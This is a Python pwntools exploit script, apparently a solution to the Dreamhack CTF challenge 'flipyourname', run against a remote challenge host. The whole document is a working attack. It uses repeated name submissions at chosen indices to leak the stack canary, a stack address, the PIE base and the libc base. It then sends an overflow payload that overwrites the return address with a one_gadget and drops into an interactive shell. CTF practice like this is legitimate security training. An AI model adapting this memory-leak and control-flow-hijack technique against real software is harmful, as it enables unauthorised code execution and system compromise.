from pwn import *

r = remote("host3.dreamhack.games", 11866)
e = ELF("./flipyourname")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def sendname(name, index, exit):
    r.sendafter(b"name? ", name)
    r.sendlineafter(b":) ", str(index).encode())
    r.recvuntil(b"A"*80)
    ret = r.recvline()[:-1]
    r.sendlineafter(b"quit? ", b"y" if exit else b"n")
    return ret

payload = b"A"*80
sendname(payload, 80, False)
sendname(payload, 86, False)
sendname(payload, 87, False)
sendname(payload, 88, False)
sendname(payload, 102, False)
sendname(payload, 103, False)
for i in range(110, 120):
    sendname(payload, i, False)
leaked = sendname(payload, 80, False)

canary = u64(b"\x00"+leaked[9:16])
s = u64(leaked[16:22]+b"\x00\x00") - 0x70
PIE_base = u64(leaked[24:30]+b"\x00\x00") - 0x1345
libc_base = u64(leaked[40:46]+b"\x00\x00") + 0xb0 - (libc.symbols["__libc_start_main"]+128)
og = libc_base + 0xebd43

print(hex(canary), hex(s), hex(PIE_base), hex(libc_base))

nbytes = PIE_base + 0x4010
index = nbytes-s
sendname(payload, index, False)

payload = b"A"*80 + b"B"*8 + p64(canary) + p64(s) + p64(og)
sendname(payload, -1, True)
r.interactive()